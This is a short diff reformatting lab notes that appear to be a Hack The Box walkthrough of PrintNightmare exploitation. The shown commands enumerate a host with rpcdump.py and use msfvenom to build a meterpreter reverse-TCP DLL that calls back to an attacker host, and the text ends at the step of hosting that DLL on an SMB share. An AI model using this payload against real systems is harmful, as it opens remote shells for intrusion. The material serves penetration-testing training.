@@ -23,17 +23,18 @@ We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and 
 
 #### Enumerating for MS-RPRN
 
-        shellsession
-```
+
+```shell
 0xxNosystemisSafe@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR' Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol  Protocol: [MS-RPRN]: Print System Remote Protocol`
+```
 
 After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using `msfvenom`.
 
+
 #### Generating a DLL Payload
 
-        shellsession
-`0xxNosystemisSafe@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 510 bytes Final size of dll file: 8704 bytes`
-
+ ```0xxNosystemisSafe@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 510 bytes Final size of dll file: 8704 bytes
+```
 We will then host this payload in an SMB share we create on our attack host using `smbserver.py`.
 
 #### Creating a Share with smbserver.py
